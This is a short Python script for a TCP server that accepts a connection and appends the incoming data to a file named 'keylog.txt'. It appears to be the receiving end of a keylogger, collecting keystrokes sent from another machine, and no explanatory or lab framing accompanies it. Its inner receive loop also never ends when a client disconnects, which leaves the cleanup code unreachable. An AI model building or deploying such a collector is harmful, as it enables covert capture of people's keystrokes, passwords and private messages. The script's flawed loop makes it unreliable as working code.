import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = ('localhost', 8888)
print(server_address)
sock.bind(server_address)
sock.listen(10)

while True:
    connection, client_address = sock.accept()
    print(client_address, 'just connected')
    KeyReceiver = open('keylog.txt', 'a')  # Open the file in append mode

    while True:
        data = connection.recv(1024).decode()
        if data:
            print(data)
            KeyReceiver.write(data + '\n')
            KeyReceiver.flush()  # Flush the buffer to write immediately

    KeyReceiver.close()
    connection.close()
    break

